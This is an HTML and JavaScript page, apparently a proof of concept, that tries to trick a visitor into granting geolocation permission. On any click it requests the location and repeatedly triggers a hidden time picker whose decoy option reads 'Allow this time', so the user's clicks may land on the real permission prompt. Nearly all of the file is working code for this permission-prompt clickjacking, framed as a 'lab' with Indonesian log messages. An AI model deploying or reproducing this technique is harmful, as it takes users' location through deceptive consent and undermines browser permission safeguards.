<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Advanced Rapid-Fire Alignment Lab</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #121212;
            color: #e0e0e0;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-end;
            min-height: 90vh;
            cursor: pointer;
        }
        h1 {
            color: #ff5252;
            font-size: 20px;
            margin-bottom: 5px;
        }
        .info-box {
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 12px;
            border-radius: 6px;
            max-width: 500px;
            width: 100%;
            font-size: 12px;
            color: #b0b0b0;
            margin-top: 15px;
            text-align: left;
        }
        code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
        .interactive-zone {
            position: relative;
            margin-bottom: 40px;
            width: 100%;
            display: flex;
            justify-content: center;
        }
    </style>
</head>
<body>

    <h1>⚠️ Rapid-Fire Alignment & Dialog Lab</h1>
    <p style="font-size: 13px; color: #888;">Uji coba respons penekanan cepat terhadap kemunculan dialog izin sistem.</p>

    <div class="interactive-zone">
        <input id="input" type="time" list="times" style="display:none;" />
        <datalist id="times">
            <select>
                <option label="-----------------------------------------">00:00</option>
                <option label="👉 [ Allow this time ] Target Area 👈">00:00</option>
                <option label="-----------------------------------------">00:00</option>
            </select>
        </datalist>
    </div>

    <div class="info-box" id="log-box">
        <strong>Status Log:</strong> Menunggu interaksi klik/sentuh...
    </div>

<script>
    const logBox = document.getElementById('log-box');

    function appendLog(msg) {
        console.log(msg);
        logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
    }

    function showList() {
        try {
            navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
                if (permissionStatus.state === 'granted') {
                    appendLog("Izin geolokasi sudah aktif.");
                    return;
                }
                input.showPicker();
                appendLog("Berhasil memicu showPicker()");
            }).catch(err => {
                appendLog("Error permissions: " + err.message);
            });
        } catch (e) {
            appendLog("[BLOCKED/DITOLAK]: " + e.message);
        }
    }

    document.body.onclick = async () => {
        appendLog("Gestur pengguna terdeteksi. Menjalankan pemicuan kilat...");
        
        // Eksekusi instan pertama
        showList();

        // Pemicuan beruntun dengan interval yang lebih ketat untuk uji batas token
        let rapidCount = 0;
        const rapidInterval = setInterval(() => {
            rapidCount++;
            appendLog(`Pemicuan cepat ke-${rapidCount}`);
            showList();
            
            if (rapidCount >= 5) {
                clearInterval(rapidInterval);
                appendLog("Siklus pemicuan cepat selesai. Perhatikan penolakan dari sistem keamanan.");
            }
        }, 100);

        // Memanggil geolocation secara asinkron paralel untuk memunculkan dialog sistem
        navigator.geolocation.getCurrentPosition(
            (pos) => { appendLog("Geolokasi diberikan: " + pos.coords.latitude); },
            (err) => { appendLog("Geolokasi diabaikan/ditolak: " + err.message); }
        );
    };
</script>

</body>
</html>
